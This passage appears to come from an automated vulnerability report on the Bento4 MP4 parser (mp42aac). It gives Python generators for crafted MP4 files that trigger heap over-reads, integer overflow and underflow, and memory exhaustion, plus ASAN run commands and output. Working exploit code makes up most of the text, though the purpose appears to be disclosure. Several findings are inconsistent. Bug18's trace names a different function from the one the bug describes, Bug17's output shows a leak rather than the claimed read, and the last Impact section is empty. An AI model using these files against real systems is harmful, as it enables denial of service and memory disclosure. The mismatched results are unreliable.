An attacker who supplies a crafted MP4 file with a ctts box that declares a minimal atom size but embeds a maximally large entry_count field can force the process to attempt allocations exceeding hundreds of megabytes, resulting in an out-of-memory crash and denial of service. This attack surface is exposed to any invocation of mp42aac or any other Bento4 tool that parses MP4 files on attacker-controlled input. No authentication or special privileges are required, and the file can be constructed in under 500 bytes.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AtomSampleTable_cpp#002 -->
<!-- DEDUP: AP4_CttsAtom::AP4_CttsAtom::CWE-789 -->

## Bug14: Heap Buffer Over-Read of num_pic_params in AP4_AvccAtom::Create()

In `AP4_AvccAtom::Create()` in `Ap4AvccAtom.cpp`, the boundary guard at line 87 (`cursor > payload_size`) permits execution to continue when `cursor == payload_size`, so line 88 reads `payload[cursor]` one byte past the end of the heap-allocated buffer, causing a heap-buffer-overflow read.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type, data=b''):
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(data)
    return struct.pack('>I4s', size, box_type) + data

def make_fullbox(box_type, version=0, flags=0, data=b''):
    return make_box(box_type, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)

# ftyp
ftyp = make_box('ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

# avcC payload (8 bytes) crafted to trigger the OOB read:
#   payload[5]&31=1 → num_seq_params=1
#   payload[6..7]=0x00 0x00 → seq_param_length=0
# After the seq-params loop: cursor=8=payload_size → payload[8] is read OOB at line 88
avcc_payload = bytes([
    0x01,       # version
    0x4D,       # profile
    0x40,       # profile_compatibility
    0x0A,       # level
    0xFF,       # nalu_length_size field
    0xE1,       # 0xE0 | num_seq_params=1
    0x00, 0x00, # seq_param_length=0 (zero-length SPS)
])
assert len(avcc_payload) == 8  # payload_size = 16 - 8 = 8

avcc = make_box('avcC', avcc_payload)  # total size=16
assert len(avcc) == 16

identity_matrix = struct.pack('>IIIIIIIII',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)

avc1_data = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    b'\x00' * 2 +
    b'\x00' * 2 +
    b'\x00' * 12 +
    struct.pack('>HH', 320, 240) +
    struct.pack('>II', 0x00480000, 0x00480000) +
    b'\x00' * 4 +
    struct.pack('>H', 1) +
    b'\x00' * 32 +
    struct.pack('>H', 0x0018) +
    struct.pack('>H', 0xFFFF) +
    avcc
)
avc1 = make_box('avc1', avc1_data)

stsd = make_fullbox('stsd', 0, 0, struct.pack('>I', 1) + avc1)
stts = make_fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc = make_fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz = make_fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
stco = make_fullbox('stco', 0, 0, struct.pack('>I', 0))
stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)

vmhd = make_fullbox('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)
url  = make_fullbox('url ', 0, 1, b'')
dref = make_fullbox('dref', 0, 0, struct.pack('>I', 1) + url)
dinf = make_box('dinf', dref)
minf = make_box('minf', vmhd + dinf + stbl)

mdhd = make_fullbox('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 0) +
    struct.pack('>HH', 0x55C4, 0))
hdlr = make_fullbox('hdlr', 0, 0,
    struct.pack('>I', 0) + b'vide' + b'\x00' * 12 + b'Video\x00')
mdia = make_box('mdia', mdhd + hdlr + minf)

tkhd = make_fullbox('tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    b'\x00' * 8 +
    struct.pack('>HHHH', 0, 0, 0x0100, 0) +
    identity_matrix +
    struct.pack('>II', 320 << 16, 240 << 16))
trak = make_box('trak', tkhd + mdia)

mvhd = make_fullbox('mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    identity_matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2))
moov = make_box('moov', mvhd + trak)

mp4_data = ftyp + moov
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)
print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000118 at pc 0x55cd0b5efb75 bp 0x7ffe7cfc7300 sp 0x7ffe7cfc72f0
READ of size 1 at 0x502000000118 thread T0
    #0 0x55cd0b5efb74 in AP4_AvccAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0x9fab74)
    #1 0x55cd0b5c71e1 in AP4_AtomFactory::CreateAtomFromStream(AP4_ByteStream&, unsigned int, unsigned int, unsigned long long, AP4_Atom*&) (mp42aac+0x9d21e1)

### Impact

An attacker who supplies a crafted MP4 file to any invocation of mp42aac can trigger a one-byte heap-buffer-overflow read immediately past the avcC payload buffer, exposing one byte of adjacent heap metadata or object data and constituting an information disclosure. In memory layouts where the adjacent byte falls in an unmapped page, the read causes a process crash, producing a denial-of-service condition. The attack surface is any use of mp42aac (or the Bento4 library) on an untrusted MP4 file, requiring no special privileges.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4AvccAtom_cpp#002 -->
<!-- DEDUP: AP4_AvccAtom::Create::CWE-125 -->

## Bug15: AP4_CttsAtom Integer Overflow in entry_count Multiplication Causes Heap Out-of-Bounds Read

In `AP4_CttsAtom::AP4_CttsAtom` (Ap4CttsAtom.cpp:77-98), the attacker-controlled `entry_count` field from the `ctts` box is multiplied by 8 without any upper-bound check, causing a 32-bit integer overflow to zero that allocates a near-zero-byte heap buffer and then reads beyond it in the subsequent loop.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for Bento4 VULN 002:
AP4_CttsAtom - Integer Overflow in entry_count*8 -> Zero-Size Buffer -> Heap OOB Read
CWE-190 (Integer Overflow) -> CWE-125 (Out-of-Bounds Read)

When entry_count = 0x20000000, the expression entry_count * 8 wraps to 0
(on 32-bit multiplication), allocating a zero-byte buffer. The subsequent
loop reading buffer[i*8] for i >= 2 reads beyond the allocation.
"""

import struct

OUTPUT_FILE = 'poc_input.mp4'


def box(type_str, payload=b''):
    """Build a standard ISO box: 4B size + 4B type + payload."""
    t = type_str.encode('ascii') if isinstance(type_str, str) else type_str
    size = 8 + len(payload)
    return struct.pack('>I4s', size, t) + payload


def fullbox(type_str, version=0, flags=0, payload=b''):
    """Build a FullBox: box header + 1B version + 3B flags + payload."""
    fb = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(type_str, fb + payload)


# --- ctts box with entry_count = 0x20000000 (the trigger) ---
# entry_count * 8 = 0x100000000 overflows 32-bit to 0
# Results in zero-size buffer allocation, then OOB read in the loop
ctts_payload = struct.pack('>I', 0x20000000)  # entry_count = 536870912, no actual entries
ctts = fullbox('ctts', version=0, flags=0, payload=ctts_payload)

# --- Minimal stts (sample-to-time, required in stbl) ---
stts = fullbox('stts', version=0, flags=0, payload=struct.pack('>I', 0))  # entry_count=0

# --- Minimal stsc (sample-to-chunk) ---
stsc = fullbox('stsc', version=0, flags=0, payload=struct.pack('>I', 0))  # entry_count=0

# --- Minimal stsz (sample sizes) ---
stsz = fullbox('stsz', version=0, flags=0, payload=struct.pack('>II', 0, 0))  # sample_size=0, sample_count=0

# --- Minimal stco (chunk offsets) ---
stco = fullbox('stco', version=0, flags=0, payload=struct.pack('>I', 0))  # entry_count=0

# --- Minimal stsd (sample description) ---
stsd = fullbox('stsd', version=0, flags=0, payload=struct.pack('>I', 0))  # entry_count=0

# --- stbl: Sample Table Box ---
stbl = box('stbl', stsd + stts + stsc + stsz + stco + ctts)

# --- dinf with minimal dref ---
# url entry: version=0, flags=1 (self-contained)
url_entry = fullbox('url ', version=0, flags=1, payload=b'')
dref = fullbox('dref', version=0, flags=0, payload=struct.pack('>I', 1) + url_entry)
dinf = box('dinf', dref)

# --- smhd: Sound Media Header ---
smhd = fullbox('smhd', version=0, flags=0, payload=struct.pack('>HH', 0, 0))  # balance + reserved

# --- minf: Media Information Box ---
minf = box('minf', smhd + dinf + stbl)

# --- mdhd: Media Header ---
# version=0: creation_time(4), modification_time(4), timescale(4), duration(4), language(2), pre_defined(2)
mdhd_payload = struct.pack('>IIIIIH', 0, 0, 44100, 0, 0x15C7, 0)  # language='und' = 0x15C7
mdhd = fullbox('mdhd', version=0, flags=0, payload=mdhd_payload)

# --- hdlr: Handler Reference ---
# pre_defined(4), handler_type(4), reserved(12), name(null-terminated)
hdlr_payload = struct.pack('>I4s12s', 0, b'soun', b'\x00' * 12) + b'Sound\x00'
hdlr = fullbox('hdlr', version=0, flags=0, payload=hdlr_payload)

# --- mdia: Media Box ---
mdia = box('mdia', mdhd + hdlr + minf)

# --- tkhd: Track Header ---
# version=0, flags=3 (track_enabled | track_in_movie)
tkhd_payload = struct.pack('>IIIII', 0, 0, 1, 0, 0)  # times, track_id, reserved, duration
tkhd_payload += struct.pack('>II', 0, 0)               # reserved[2]
tkhd_payload += struct.pack('>hhhh', 0, 0, 0x0100, 0)  # layer, alt_group, volume, reserved
# Unity matrix: { 0x00010000,0,0, 0,0x00010000,0, 0,0,0x40000000 }
tkhd_payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_payload += struct.pack('>II', 0, 0)               # width, height
tkhd = fullbox('tkhd', version=0, flags=3, payload=tkhd_payload)

# --- trak: Track Box ---
trak = box('trak', tkhd + mdia)

# --- mvhd: Movie Header ---
mvhd_payload = struct.pack('>IIII', 0, 0, 1000, 0)    # times, timescale, duration
mvhd_payload += struct.pack('>Ih', 0x00010000, 0x0100) # rate=1.0, volume=1.0
mvhd_payload += b'\x00' * 10                            # reserved
# Unity matrix
mvhd_payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_payload += b'\x00' * 24                            # pre_defined
mvhd_payload += struct.pack('>I', 2)                    # next_track_id
mvhd = fullbox('mvhd', version=0, flags=0, payload=mvhd_payload)

# --- moov: Movie Box ---
moov = box('moov', mvhd + trak)

# --- ftyp: File Type Box ---
ftyp = box('ftyp', b'isom' + struct.pack('>I', 0x00000000) + b'isom' + b'iso2')

# --- Assemble final MP4 ---
data = ftyp + moov

with open(OUTPUT_FILE, 'wb') as f:
    f.write(data)

print(f'Written {len(data)} bytes to {OUTPUT_FILE}')
print(f'ctts entry_count = 0x20000000 (536870912)')
print(f'Expected: entry_count*8 overflows 32-bit to 0, zero-byte allocation, OOB read')
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000171 at pc 0x555eb82fd094 bp 0x7ffdf1bfe650 sp 0x7ffdf1bfe640
READ of size 1 at 0x502000000171 thread T0
    #0 0x555eb82fd093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&)
    #1 0x555eb82fe087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&)

### Impact

An attacker who supplies a crafted MP4 file with a `ctts` box containing `entry_count = 0x20000000` can trigger a heap-buffer-overflow read in `AP4_CttsAtom::AP4_CttsAtom`, causing the parser to read arbitrary bytes from adjacent heap memory and store them as composition time offsets, which constitutes an information disclosure primitive. This vulnerability is exposed to any invocation of `mp42aac` on an untrusted MP4 file, requiring no special privileges or user interaction beyond opening the file. On systems with insufficient memory to satisfy the enormous internal array allocation, the bug degrades to an out-of-memory denial of service.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Atom_h#002 -->
<!-- DEDUP: `AP4_CttsAtom::AP4_CttsAtom::CWE-190 -->

## Bug16: AP4_TrunAtom unchecked SetItemCount failure causes memory exhaustion and crash

In `AP4_TrunAtom::AP4_TrunAtom` (`Ap4TrunAtom.cpp`, lines 127-151), the return value of `m_Entries.SetItemCount(sample_count)` is never checked after reading a caller-controlled `sample_count` from the trun box, allowing an attacker to trigger a ~4 GB allocation that exhausts available memory and crashes the process.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload

def build_ftyp():
    payload = b"isom"
    payload += struct.pack(">I", 0)
    payload += b"isom" + b"iso2" + b"mp41"
    return box(b"ftyp", payload)

def build_mvhd():
    payload = b"\x00"
    payload += b"\x00\x00\x00"
    payload += struct.pack(">I", 0)
    payload += struct.pack(">I", 0)
    payload += struct.pack(">I", 1000)
    payload += struct.pack(">I", 0)
    payload += struct.pack(">i", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 10
    payload += struct.pack(">III", 0x00010000, 0, 0)
    payload += struct.pack(">III", 0, 0x00010000, 0)
    payload += struct.pack(">III", 0, 0, 0x40000000)
    payload += b"\x00" * 24
    payload += struct.pack(">I", 2)
    return box(b"mvhd", payload)

def build_moov():
    return box(b"moov", build_mvhd())

def build_mfhd():
    payload = b"\x00"
    payload += b"\x00\x00\x00"
    payload += struct.pack(">I", 1)
    return box(b"mfhd", payload)

def build_tfhd(track_id=1):
    payload = b"\x00"
    payload += b"\x00\x00\x00"
    payload += struct.pack(">I", track_id)
    return box(b"tfhd", payload)

def build_trun():
    payload = b"\x00"
    payload += b"\x00\x00\x01"
    payload += struct.pack(">I", 0x10000000)  # malicious sample_count
    payload += struct.pack(">i", 0)
    return box(b"trun", payload)

def build_traf():
    return box(b"traf", build_tfhd() + build_trun())

def build_moof():
    return box(b"moof", build_mfhd() + build_traf())

def build_mdat():
    return box(b"mdat", b"")

ftyp = build_ftyp()
moov = build_moov()
moof = build_moof()
mdat = build_mdat()
mp4 = ftyp + moov + moof + mdat

with open("poc_input.mp4", "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:soft_rss_limit_mb=400:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: specified RSS limit exceeded, currently set to soft_rss_limit_mb=400
    #0 0x... in operator new(unsigned long) asan_new_delete.cpp:99
    #1 0x... in AP4_ContainerAtom::ReadChildren(AP4_AtomFactory&, AP4_ByteStream&, unsigned long long)
SUMMARY: AddressSanitizer: rss-limit-exceeded ../../../../src/libsanitizer/asan/asan_new_delete.cpp:99 in operator new(unsigned long)

### Impact

An attacker who supplies a crafted MP4 file with a trun box carrying `sample_count=0x10000000` causes `AP4_TrunAtom` to attempt a ~4 GB heap allocation (`268435456 * 16` bytes) with no upper-bound check, exhausting physical memory and crashing the process. This exposes a denial-of-service condition on any mp42aac invocation that processes an untrusted MP4 file. On 32-bit builds the multiplication `sample_count * sizeof(Entry)` can overflow to a small value, resulting in a subsequent heap buffer overflow with potential for heap corruption beyond a crash.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Config_h#003 -->
<!-- DEDUP: AP4_TrunAtom::AP4_TrunAtom::CWE-252 -->

## Bug17: AP4_DecoderConfigDescriptor uint32 underflow creates unbounded SubStream leading to out-of-bounds read

In `AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor()` in `Ap4DecoderConfigDescriptor.cpp` (line 92), no check is performed to ensure `payload_size >= 13` before computing `payload_size - 13` as an unsigned `AP4_Size`, so a crafted descriptor with `payload_size < 13` causes an integer underflow that creates an approximately 4 GB `AP4_SubStream` and allows the descriptor factory loop to read file bytes far beyond the declared descriptor boundary.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct, os

OUTPUT_PATH = "poc_input.mp4"

def box(t: str, payload: bytes) -> bytes:
    return struct.pack(">I", 8 + len(payload)) + t.encode() + payload

def full_box(t: str, version: int, flags: int, payload: bytes) -> bytes:
    hdr = bytes([version, (flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF])
    return box(t, hdr + payload)

def desc(tag: int, payload: bytes) -> bytes:
    size = len(payload)
    assert size < 0x80
    return bytes([tag, size]) + payload

ftyp = box("ftyp", b"mp42" + struct.pack(">I", 0) + b"mp42" + b"isom")

MATRIX = struct.pack(">9I",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)

mvhd_payload = (
    b"\x00\x00\x00\x00"
    + struct.pack(">II", 0, 0)
    + struct.pack(">I", 44100)
    + struct.pack(">I", 0)
    + struct.pack(">I", 0x00010000)
    + struct.pack(">H", 0x0100)
    + b"\x00" * 10
    + MATRIX
    + b"\x00" * 24
    + struct.pack(">I", 2)
)
assert len(mvhd_payload) == 100
mvhd = box("mvhd", mvhd_payload)

tkhd_payload = (
    b"\x00\x00\x00\x03"
    + struct.pack(">II", 0, 0)
    + struct.pack(">I", 1)
    + b"\x00" * 4
    + struct.pack(">I", 0)
    + b"\x00" * 8
    + struct.pack(">HH", 0, 0)
    + struct.pack(">H", 0x0100)
    + b"\x00" * 2
    + MATRIX
    + struct.pack(">II", 0, 0)
)
assert len(tkhd_payload) == 84
tkhd = box("tkhd", tkhd_payload)

mdhd_payload = (
    b"\x00\x00\x00\x00"
    + struct.pack(">II", 0, 0)
    + struct.pack(">I", 44100)
    + struct.pack(">I", 0)
    + struct.pack(">HH", 0x15C7, 0)
)
assert len(mdhd_payload) == 24
mdhd = box("mdhd", mdhd_payload)

hdlr_payload = (
    b"\x00\x00\x00\x00"
    + b"\x00" * 4
    + b"soun"
    + b"\x00" * 12
    + b"SoundHandler\x00"
)
hdlr = box("hdlr", hdlr_payload)

smhd = box("smhd", b"\x00\x00\x00\x00" + b"\x00" * 4)

url_payload = b"\x00\x00\x00\x01"
url_box = box("url ", url_payload)
dref_payload = b"\x00\x00\x00\x00" + struct.pack(">I", 1) + url_box
dref = box("dref", dref_payload)
dinf = box("dinf", dref)

# Variant A: ES payload=19, DC payload=12 -> underflow 12-13=0xFFFFFFFF
dc_a_payload = struct.pack(">BB", 0x40, 0x15) + b"\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00"
assert len(dc_a_payload) == 12
dc_a = desc(0x04, dc_a_payload)
extra_a = b"\xAA\xBB"
es_a_inner = struct.pack(">H", 0x0001) + b"\x00" + dc_a + extra_a
assert len(es_a_inner) == 19
es_a = desc(0x03, es_a_inner)
esds_a = box("esds", b"\x00\x00\x00\x00" + es_a)

# Variant B: ES payload=20, DC payload=0 -> underflow 0-13=0xFFFFFFF3
dc_b = desc(0x04, b"")
extra_b_for_dc_reads = struct.pack(">BB", 0x40, 0x15) + b"\x00" * 11
extra_b_for_substream = b"\xCC\xDD"
es_b_inner = struct.pack(">H", 0x0001) + b"\x00" + dc_b + extra_b_for_dc_reads + extra_b_for_substream
assert len(es_b_inner) == 20
es_b = desc(0x03, es_b_inner)
esds_b = box("esds", b"\x00\x00\x00\x00" + es_b)

# Variant C: DC directly in esds (raw file stream), DC payload=12
dc_c_payload = struct.pack(">BB", 0x40, 0x15) + b"\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00"
assert len(dc_c_payload) == 12
dc_c = desc(0x04, dc_c_payload)
esds_c = box("esds", b"\x00\x00\x00\x00" + dc_c)

def mp4a_entry(esds_box: bytes) -> bytes:
    mp4a_inner = (
        b"\x00" * 6
        + struct.pack(">H", 1)
        + b"\x00" * 8
        + struct.pack(">HH", 2, 16)
        + b"\x00\x00"
        + b"\x00\x00"
        + struct.pack(">I", 44100 << 16)
        + esds_box
    )
    return box("mp4a", mp4a_inner)

mp4a_a = mp4a_entry(esds_a)
mp4a_b = mp4a_entry(esds_b)
mp4a_c = mp4a_entry(esds_c)

stsd_payload = (
    b"\x00\x00\x00\x00"
    + struct.pack(">I", 3)
    + mp4a_a + mp4a_b + mp4a_c
)
stsd = box("stsd", stsd_payload)

stts = box("stts", b"\x00\x00\x00\x00" + struct.pack(">I", 0))
stsc = box("stsc", b"\x00\x00\x00\x00" + struct.pack(">I", 0))
stsz = box("stsz", b"\x00\x00\x00\x00" + struct.pack(">II", 0, 0))
stco = box("stco", b"\x00\x00\x00\x00" + struct.pack(">I", 0))

stbl = box("stbl", stsd + stts + stsc + stsz + stco)
minf = box("minf", smhd + dinf + stbl)
mdia = box("mdia", mdhd + hdlr + minf)
trak = box("trak", tkhd + mdia)
moov = box("moov", mvhd + trak)

mp4_data = ftyp + moov
with open(OUTPUT_PATH, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_PATH}")
print("    Variant A: ES payload=19, DC payload=12 -> underflow 0xFFFFFFFF")
print("    Variant B: ES payload=20, DC payload=0  -> underflow 0xFFFFFFF3")
print("    Variant C: DC directly in esds, payload=12 -> raw file stream OOB")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: LeakSanitizer: detected memory leaks
Indirect leak of 88 byte(s) in 1 object(s) allocated from:
    #0 in operator new(unsigned long) asan_new_delete.cpp:99
    #1 in AP4_DescriptorFactory::CreateDescriptorFromStream(AP4_ByteStream&, AP4_Descriptor*&) mp42aac+0xac6ea9
    #2 in AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor(AP4_ByteStream&, unsigned int, unsigned int) mp42aac+0xac114d
SUMMARY: AddressSanitizer: 265 byte(s) leaked in 6 allocation(s).

### Impact

An attacker who supplies a crafted MP4 file with a `DecoderConfig` descriptor whose declared `payload_size` is less than 13 causes an unsigned integer underflow in `AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor()`, resulting in an approximately 4 GB `AP4_SubStream` through which the descriptor factory reads and interprets file bytes far outside the declared descriptor boundary. The out-of-bounds read allows arbitrary file content to be parsed as MPEG-4 descriptors, confirmed by ASAN to produce object allocations from attacker-controlled bytes, enabling information disclosure and denial of service. Any invocation of `mp42aac` on an untrusted MP4 file exercises this path with no additional privileges required.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4Command_h#004 -->
<!-- DEDUP: AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor::CWE-191 -->

## Bug18: AP4_TrunAtom Unvalidated sample_count Causes Heap Buffer Overflow

In `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp`, the constructor reads `sample_count` from the stream as an `AP4_UI32` without validating it against the atom size, and ignores the error return of `m_Entries.SetItemCount(sample_count)`, so a crafted value of `0x10000000` triggers an OOM allocation failure that leaves `m_Items` as NULL and the subsequent per-sample loop dereferences a NULL pointer, causing heap memory corruption that propagates through the parse chain and results in a heap-buffer-overflow.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for Bento4 VULN: AP4_TrunAtom Unvalidated sample_count -> Null Pointer Dereference / Heap Overflow

Constructs a minimal fragmented MP4 with a trun atom containing
sample_count = 0x10000000 (268 million) but actual atom size = 16 bytes
(no sample data). This causes OOM when trying to allocate 268M entries,
leaving m_Items as NULL, then the loop dereferences the NULL pointer.
"""

import struct

OUTPUT_FILE = "poc_input.mp4"


def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type.encode()) + payload


def fullbox(box_type, version, flags, payload):
    size = 12 + len(payload)
    header = struct.pack(">I4sBBBB", size, box_type.encode(), version,
                         (flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF)
    return header + payload


def build_ftyp():
    payload = b'iso5'
    payload += struct.pack(">I", 0)
    payload += b'iso5'
    return box('ftyp', payload)


def build_mvhd():
    payload = struct.pack(">IIII", 0, 0, 1000, 0)
    payload += struct.pack(">I", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b'\x00' * 10
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += b'\x00' * 24
    payload += struct.pack(">I", 2)
    return fullbox('mvhd', 0, 0, payload)


def build_tkhd():
    payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)
    payload += b'\x00' * 8
    payload += struct.pack(">HH", 0, 0)
    payload += struct.pack(">HH", 0, 0)
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += struct.pack(">II", 0, 0)
    return fullbox('tkhd', 0, 0x000001, payload)


def build_mdhd():
    payload = struct.pack(">IIIII", 0, 0, 1000, 0, 0)
    return fullbox('mdhd', 0, 0, payload)


def build_hdlr():
    payload = struct.pack(">I", 0)
    payload += b'soun'
    payload += b'\x00' * 12
    payload += b'\x00'
    return fullbox('hdlr', 0, 0, payload)


def build_smhd():
    payload = struct.pack(">HH", 0, 0)
    return fullbox('smhd', 0, 0, payload)


def build_dref():
    url_entry = fullbox('url ', 0, 0x000001, b'')
    payload = struct.pack(">I", 1)
    payload += url_entry
    return fullbox('dref', 0, 0, payload)


def build_dinf():
    return box('dinf', build_dref())


def build_stts():
    payload = struct.pack(">I", 0)
    return fullbox('stts', 0, 0, payload)


def build_stsc():
    payload = struct.pack(">I", 0)
    return fullbox('stsc', 0, 0, payload)


def build_stsz():
    payload = struct.pack(">II", 0, 0)
    return fullbox('stsz', 0, 0, payload)


def build_stco():
    payload = struct.pack(">I", 0)
    return fullbox('stco', 0, 0, payload)


def build_stsd():
    payload = struct.pack(">I", 0)
    return fullbox('stsd', 0, 0, payload)


def build_stbl():
    data = build_stsd()
    data += build_stts()
    data += build_stsc()
    data += build_stsz()
    data += build_stco()
    return box('stbl', data)


def build_minf():
    data = build_smhd()
    data += build_dinf()
    data += build_stbl()
    return box('minf', data)


def build_mdia():
    data = build_mdhd()
    data += build_hdlr()
    data += build_minf()
    return box('mdia', data)


def build_trak():
    data = build_tkhd()
    data += build_mdia()
    return box('trak', data)


def build_trex():
    payload = struct.pack(">IIIII", 1, 1, 0, 0, 0)
    return fullbox('trex', 0, 0, payload)


def build_mvex():
    return box('mvex', build_trex())


def build_moov():
    data = build_mvhd()
    data += build_trak()
    data += build_mvex()
    return box('moov', data)


def build_mfhd(sequence_number=1):
    payload = struct.pack(">I", sequence_number)
    return fullbox('mfhd', 0, 0, payload)


def build_tfhd(track_id=1):
    payload = struct.pack(">I", track_id)
    return fullbox('tfhd', 0, 0x000000, payload)


def build_trun_malicious():
    # sample_count = 0x10000000 (268,435,456) with flags=0x000200 (SAMPLE_SIZE_PRESENT)
    # Atom is only 16 bytes total; claims 268M samples to trigger OOM then NULL deref
    MALICIOUS_SAMPLE_COUNT = 0x10000000
    FLAGS = 0x000200  # AP4_TRUN_FLAG_SAMPLE_SIZE_PRESENT forces per-sample loop access
    payload = struct.pack(">I", MALICIOUS_SAMPLE_COUNT)
    return fullbox('trun', 0, FLAGS, payload)


def build_traf():
    data = build_tfhd(track_id=1)
    data += build_trun_malicious()
    return box('traf', data)


def build_moof():
    data = build_mfhd(sequence_number=1)
    data += build_traf()
    return box('moof', data)


def build_mdat():
    return box('mdat', b'')


def build_fragmented_mp4():
    data = build_ftyp()
    data += build_moov()
    data += build_moof()
    data += build_mdat()
    return data


if __name__ == "__main__":
    mp4_data = build_fragmented_mp4()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)
    print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
    print(f"[+] trun sample_count = 0x10000000 ({0x10000000} samples)")
    print("[+] trun atom size = 16 bytes (header + sample_count only, no actual data)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:allocator_may_return_null=1" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x563f76e65094 bp 0x7fffcc2d79f0 sp 0x7fffcc2d79e0
READ of size 1 at 0x502000000111 thread T0
    #0 0x563f76e65093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 0x563f76e66087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

